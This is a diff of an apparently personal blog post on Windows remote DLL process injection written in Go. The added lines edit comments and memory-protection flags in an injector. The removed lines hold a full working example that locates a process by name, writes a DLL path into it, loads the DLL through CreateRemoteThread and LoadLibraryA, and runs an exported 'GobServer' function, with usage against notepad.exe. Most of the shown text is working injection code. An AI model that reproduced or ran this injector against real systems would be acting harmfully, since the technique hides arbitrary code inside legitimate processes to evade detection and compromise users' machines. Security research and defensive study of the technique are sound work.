@@ -407,7 +407,7 @@ func main() {
 	fmt.Println(va2)
 	defer virtualFreeEx.Call(rb, 0, MEM_RELEASE)
 
-	// copy evil DLL between processes
+	// copy dll to memory
 	dllPtr, err := syscall.BytePtrFromString(targetDll)
 	wp1, wp2, err := writeProcessMemory.Call(ph, rb, uintptr(unsafe.Pointer(dllPtr)), uintptr(dllLength), 0)
 	if err != nil {
@@ -416,7 +416,7 @@ func main() {
 	fmt.Println(wp1)
 	fmt.Println(wp2)
 
-	// start new thread
+	// start new thread - load the dll
 	crt1, crt2, err := createRemoteThread.Call(
 		ph,
 		0,
@@ -704,7 +704,7 @@ func main() {
 		0,
 		uintptr(uintptr(dllLength)*2),
 		uintptr(MEM_RESERVE|MEM_COMMIT),
-		uintptr(PAGE_EXECUTE_READWRITE),
+		uintptr(PAGE_READ_WRITE),
 	)
 	if err != nil {
 		fmt.Println("Results of virtualAllocEx:", err)
@@ -754,19 +754,7 @@ func main() {
 	fmt.Printf("crt1: %#x\n", crt1)
 	fmt.Printf("crt2: %#x\n", crt2)
 
-	// This will keep the golang script alive... if that's what you want.
-	// wfso, err := syscall.WaitForSingleObject(syscall.Handle(foo), syscall.INFINITE)
-	// if err != nil {
-	// 	fmt.Println("Results of WaitForSingleObject", err)
-	// }
-	// fmt.Println(wfso)
-
-	fmt.Println("\n--- Additional Logging ---")
-	fmt.Println("targetDll:", targetDll)
-	fmt.Println("dllLength:", dllLength)
-	fmt.Printf("dllPtr: %#x\n", uintptr(unsafe.Pointer(dllPtr)))
-
-	// start new thread
+	// start new thread - call exported funtion from dll
 	crt3, crt4, err := createRemoteThread.Call(
 		ph,
 		0,
@@ -782,11 +770,23 @@ func main() {
 	fmt.Printf("crt3: %#x\n", crt3)
 	fmt.Printf("crt4: %#x\n", crt4)
 
+	// This will keep the golang script alive... if that's what you want.
+	// wfso, err := syscall.WaitForSingleObject(syscall.Handle(foo), syscall.INFINITE)
+	// if err != nil {
+	// 	fmt.Println("Results of WaitForSingleObject", err)
+	// }
+	// fmt.Println(wfso)
+
+	fmt.Println("\n--- Additional Logging ---")
+	fmt.Println("targetDll:", targetDll)
+	fmt.Println("dllLength:", dllLength)
+	fmt.Printf("dllPtr: %#x\n", uintptr(unsafe.Pointer(dllPtr)))
+
 	fmt.Println("Function called successfully")
 }
 ```  
 
-## Basically we had to mimic the structure of the dll on disk. We get the dll base address, we get the exported function's address (we actually called this by name, which is handy) and were able to calculate the offset. Once we know the offset, we can access the function in memory by adding the offset to the base address of our remote buffer. We create a new thread and point it at our remote buffer + offset address. 
+## Basically we had to mimic the structure of the dll on disk. We get the dll base address, we get the exported function's address (we actually called this by name, which is handy) and we able to calculate the offset (function address - dll base address). Once we know the offset, we can access the function in memory by adding the offset to the base address of our remote buffer. We create a new thread and pass it our in memory (buffer + offset) address. 
 
 
 Here's our fully injected notepad.exe running our gob server.  
@@ -890,238 +890,6 @@ func main() {
 	}
 }
 ```  
-
-## The following is a borked, early version of my code when initially writing this post. The cool thing is it loads a local dll very well, and is thus perfect for testing the gob server and client.  It also has the functionality to find a process id by name using CreateToolhelp32Snapshot, Process32FirstW, and Process32NextW. It does use "golang.org/x/sys/windows" so you need to run these commands first to install the package before running.
-
-```  
-go mod init example-5
-```  
-
-**then**
-
-```  
-go get -u golang.org/x/sys/windows
-```  
-
-**I would honestly leave it out, and refactor this based on the previous code I provided.**  
-
-- example-5.go  
-
-```go  
-package main
-
-import (
-	"fmt"
-	"log"
-	"os"
-	"strings"
-	"syscall"
-	"unsafe"
-
-	"golang.org/x/sys/windows"
-)
-
-var (
-	kernel32DLL              = syscall.NewLazyDLL("kernel32.dll")
-	loadLibraryA             = kernel32DLL.NewProc("LoadLibraryA")
-	virtualAllocEx           = kernel32DLL.NewProc("VirtualAllocEx")
-	writeProcessMemory       = kernel32DLL.NewProc("WriteProcessMemory")
-	createRemoteThread       = kernel32DLL.NewProc("CreateRemoteThread")
-	createToolhelp32Snapshot = kernel32DLL.NewProc("CreateToolhelp32Snapshot")
-	process32FirstW          = kernel32DLL.NewProc("Process32FirstW")
-	process32NextW           = kernel32DLL.NewProc("Process32NextW")
-)
-
-const (
-	PROCESS_QUERY_INFORMATION = 0x0400
-	PROCESS_VM_WRITE          = 0x0020
-	PROCESS_VM_OPERATION      = 0x0008
-	PROCESS_CREATE_THREAD     = 0x0002
-	MEM_RESERVE               = 0x00002000
-	MEM_COMMIT                = 0x00001000
-	TH32CS_SNAPPROCESS        = 0x00000002
-	MAX_PATH                  = 260
-	PROCESS_ALL_ACCESS        = PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
-
-	evilDLLPath     = "c:\\gob-server.dll"
-	evilDLLFuncName = "GobServer"
-)
-
-func FindProcessID(processName string) (uint32, error) {
-	snapshot, _, _ := createToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
-	if snapshot == 0 {
-		return 0, fmt.Errorf("Failed to create snapshot. Error: %d", syscall.GetLastError())
-	}
-	defer syscall.CloseHandle(syscall.Handle(snapshot))
-
-	var entry windows.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-	ret, _, _ := process32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
-	if ret == 0 {
-		return 0, fmt.Errorf("Failed to retrieve first process entry. Error: %d", syscall.GetLastError())
-	}
-
-	for {
-		exeFile := windows.UTF16ToString(entry.ExeFile[:])
-		if strings.EqualFold(exeFile, processName) {
-			return entry.ProcessID, nil
-		}
-
-		ret, _, _ := process32NextW.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
-		if ret == 0 {
-			break
-		}
-	}
-
-	return 0, fmt.Errorf("Process not found: %s", processName)
-}
-
-func injectDLL(processHandle windows.Handle, dllPath string) error {
-	dllPathPtr, err := windows.UTF16PtrFromString(dllPath)
-	if err != nil {
-		return err
-	}
-
-	remoteAlloc, _, err := virtualAllocEx.Call(
-		uintptr(processHandle),
-		0,
-		uintptr(len(dllPath)*2),
-		uintptr(MEM_RESERVE|MEM_COMMIT),
-		uintptr(windows.PAGE_READWRITE),
-	)
-	if remoteAlloc == 0 {
-		return fmt.Errorf("VirtualAllocEx failed: %v", err)
-	}
-
-	fmt.Println("[+] VirtualAllocEx...")
-	fmt.Println("[+] Allocating memory at:", remoteAlloc)
-
-	bytesWritten := uint(0)
-	_, _, err = writeProcessMemory.Call(
-		uintptr(processHandle),
-		remoteAlloc,
-		uintptr(unsafe.Pointer(dllPathPtr)),
-		uintptr(len(dllPath)*2),
-		uintptr(unsafe.Pointer(&bytesWritten)),
-	)
-	if bytesWritten == 0 {
-		return fmt.Errorf("WriteProcessMemory failed: %v", err)
-	}
-	fmt.Println("[+] Bytes written:", bytesWritten)
-
-	threadHandle, _, err := createRemoteThread.Call(
-		uintptr(processHandle),
-		0,
-		0,
-		uintptr(loadLibraryA.Addr()),
-		remoteAlloc,
-		0,
-		0,
-	)
-	if threadHandle == 0 {
-		return fmt.Errorf("CreateRemoteThread failed: %v", err)
-	}
-	fmt.Println("[+] CreateRemoteThread...")
-	fmt.Println("[+] Thread Handle:", threadHandle)
-
-	_, err = syscall.WaitForSingleObject(syscall.Handle(threadHandle), syscall.INFINITE)
-	if err != nil {
-		return fmt.Errorf("WaitForSingleObject failed: %v", err)
-	}
-	fmt.Println("[+] WaitForSingleObject...")
-	return nil
-}
-
-func executeExportedFunction(processHandle windows.Handle) error {
-
-	evilDLLHandle, err := syscall.LoadLibrary(evilDLLPath)
-	if err != nil {
-		return fmt.Errorf("Failed to load the DLL: %v", err)
-	}
-	fmt.Println("[+] Loading Library:", evilDLLPath)
-	fmt.Println("[+] DLL Handle:", evilDLLHandle)
-	defer syscall.FreeLibrary(evilDLLHandle)
-
-	getProcAddressProc := syscall.NewLazyDLL(evilDLLPath).NewProc(evilDLLFuncName)
-	evilDLLFuncAddress, _, err := getProcAddressProc.Call()
-	fmt.Println("[+] Function Address:", evilDLLFuncAddress)
-	fmt.Println("[+] Function Name:", evilDLLFuncName)
-
-	if err != nil {
-		return fmt.Errorf("\n[err] executeExportedFunction(): ", err)
-	}
-
-	threadHandle, _, err := createRemoteThread.Call(
-		uintptr(processHandle),
-		0,
-		0,
-		evilDLLFuncAddress,
-		0,
-		0,
-	)
-	if threadHandle == 0 {
-		return fmt.Errorf("CreateRemoteThread failed: %v", err)
-	}
-	_, err = syscall.WaitForSingleObject(syscall.Handle(threadHandle), syscall.INFINITE)
-	if err != nil {
-		return fmt.Errorf("WaitForSingleObject failed: %v", err)
-	}
-
-	return nil
-}
-
-func main() {
-	if len(os.Args) < 2 {
-		fmt.Println("Process name not provided. Exiting...")
-		return
-	}
-
-	processName := os.Args[1]
-	fmt.Println("[+] Process name:", processName)
-
-	processID, err := FindProcessID(processName)
-	if err != nil {
-		log.Println("Error finding process:", err)
-		return
-	}
-	fmt.Println("[+] Process ID:", processID)
-
-	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, processID)
-	if err != nil {
-		log.Println("OpenProcess failed:", err)
-		return
-	}
-	fmt.Println("[+] Opening process...")
-	fmt.Println("[+] Process Handle:", processHandle)
-	defer syscall.CloseHandle(processHandle)
-
-	fmt.Println("[+] DLL Path Length:", len(evilDLLPath))
-	err = injectDLL(windows.Handle(processHandle), evilDLLPath)
-	if err != nil {
-		log.Println("DLL injection failed:", err)
-		return
-	}
-	fmt.Println("[+] DLL injected successfully.")
-
-	err = executeExportedFunction(windows.Handle(processHandle))
-	if err != nil {
-		fmt.Errorf("\n[err] main():", err)
-		return
-	}
-	fmt.Println("[+] main() function executed successfully.")
-}
-```  
-
-usage:  
-
-```  
-go run example-5 notepad.exe
-```  
-
-![](/go-remote-dll-process-injection/example-5-success.png)  
-> skript name in photo in different than example-5, but is the same code.
-
-## What a week. Its been awesome researching and writing this. Hit me up and connect, especially if you like teh G0L4ngz.  
 
 ## Donezo Funzo
 
